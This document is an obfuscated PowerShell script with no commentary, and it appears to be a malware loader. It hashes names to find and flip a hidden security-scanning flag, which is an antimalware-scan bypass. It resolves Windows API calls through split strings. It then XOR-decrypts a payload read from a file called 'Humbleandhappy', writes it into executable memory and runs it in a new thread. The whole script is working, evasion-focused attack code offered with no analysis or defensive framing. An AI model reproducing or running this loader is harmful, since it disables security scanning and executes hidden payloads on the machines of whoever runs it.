function vmzbeqjhuo($btldoljlw) {
  $nssibu = [uint32]::MaxValue
  $ngpdmwv = [uint32]0xEDB88320L
  $zystna = [System.Text.Encoding]::UTF8.GetBytes($btldoljlw)
	
  foreach ($bkdcklxvawgb in $zystna) {
    $nssibu = ($nssibu -bxor $bkdcklxvawgb)
    foreach ($xezgialtew in 0..7) {
      if ($nssibu -band 1) {
        $nssibu = [math]::Floor($nssibu * [math]::Pow(2, -1)) -bxor $ngpdmwv
      } else {
        $nssibu = [math]::Floor($nssibu * [math]::Pow(2, -1))
      }
    }
  }
	  
  return [uint32]::MaxValue - $nssibu
}

if ($PSVersionTable.PSVersion.Major -ge 5) {
  $bgqshjavharp = [AppDomain]::CurrentDomain

  foreach ($vgpabn in $bgqshjavharp.GetAssemblies()) {
    if ((vmzbeqjhuo ([IO.Path]::GetFileName($vgpabn.Location))) -eq 0x48B63173L) {
      $nfkugziiwyw = $vgpabn
      break
    }
  }

  foreach($nshzhplwywx in $nfkugziiwyw.GetTypes()) {
    if ((vmzbeqjhuo $nshzhplwywx.FullName) -eq 0x0FE874F1L) {
      $sqqahdpdvc = $nshzhplwywx
      break
    }
  }

  foreach($zmeuupaqywma in $sqqahdpdvc.GetFields([System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)) {
    if ((vmzbeqjhuo $zmeuupaqywma.Name) -eq 0xF8936817L) {
      $bhyuinlck = $zmeuupaqywma
      break
    }
  }
  $bhyuinlck.SetValue($null, $true)
}

function qevpwtedsg {
  Param ($igikumshzeew, $enqbgjq)
  $bjkheoqy = $null
  $izyzszsq = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And [IO.Path]::GetFileName($_.Location).Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $izyzszsq.GetMethods() | % { 
    $nssibu = [uint32](vmzbeqjhuo $_.Name)
    If ($nssibu -eq [uint32]0xC97C1FFFL -And $bjkheoqy -eq $null) { 
      $bjkheoqy = $izyzszsq.GetMethod($_.Name, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])) 
    } 
    Elseif ($nssibu -eq [uint32]0x82E6245CL) { 
      $ralpaz = $_ 
    }
  }

  $yxlhim = $ralpaz.Invoke($null, @($igikumshzeew))

  $ajzthje = New-Object IntPtr
  $beszjzgjwhwa = New-Object System.Runtime.InteropServices.HandleRef($ajzthje, $yxlhim)

  return $bjkheoqy.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$beszjzgjwhwa, $enqbgjq))
}

function jtkyfq {
  Param (
    [Parameter(Position=0, Mandatory=$True)][Type[]] $bovdydkpg,
    [Parameter(Position=1)][Type] $idsqreo = [Void]
  )

  $nshzhplwywx = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  $nshzhplwywx.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bovdydkpg).SetImplementationFlags('Runtime, Managed')
  $nshzhplwywx.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $idsqreo, $bovdydkpg).SetImplementationFlags('Runtime, Managed')
  return $nshzhplwywx.CreateType()
}

function dahyzfdlclf {
  Param([Byte[]] $ggrssqmbqg)

  [Byte[]] $xsijwidwc = @(0xc5, 0xc2, 0x4d, 0xab, 0x2c, 0xac, 0xa9, 0x00)
  $ecmzjeoat = $ggrssqmbqg.Length
  $zuvxoupfa = New-Object byte[] $ecmzjeoat
  [System.Buffer]::BlockCopy($ggrssqmbqg, 0, $zuvxoupfa, 0, $ecmzjeoat)
  for($jbvcgheohsv = 0;$jbvcgheohsv -lt $ecmzjeoat;$jbvcgheohsv++) {
    $gqnflrllqi = $ggrssqmbqg[$jbvcgheohsv]
    $nfkugziiwyw = $xsijwidwc[$jbvcgheohsv % 8]
    $zuvxoupfa[$jbvcgheohsv] = (($gqnflrllqi -band -bnot $nfkugziiwyw) -bor ($nfkugziiwyw -band -bnot $gqnflrllqi))
  }
  return $zuvxoupfa
}

$fqzfthrhnwm = [IO.File]::ReadAllBytes('Humbleandhappy')
$fqzfthrhnwm = dahyzfdlclf $fqzfthrhnwm

$igikumshzeew = 'ker'
$igikumshzeew += 'nel32'
$igikumshzeew += '.dll'

$enqbgjq = 'Virt'
$enqbgjq += 'ualA';
$enqbgjq += 'lloc';
$oxrxcolkotdm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qevpwtedsg $igikumshzeew $enqbgjq), (jtkyfq @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $fqzfthrhnwm.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($fqzfthrhnwm, 0, $oxrxcolkotdm, $fqzfthrhnwm.Length)

$enqbgjq = 'Crea'
$enqbgjq += 'teTh'
$enqbgjq += 'read'
$cynwnagg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qevpwtedsg $igikumshzeew $enqbgjq), (jtkyfq @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $oxrxcolkotdm, [IntPtr]::Zero, 0, [IntPtr]::Zero)

$enqbgjq = 'Wai'
$enqbgjq += 'tForS'
$enqbgjq += 'ingleOb'
$enqbgjq += 'ject'
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qevpwtedsg $igikumshzeew $enqbgjq), (jtkyfq @([IntPtr], [Int32]) ([Int]))).Invoke($cynwnagg, 0xFFFFFFFF)
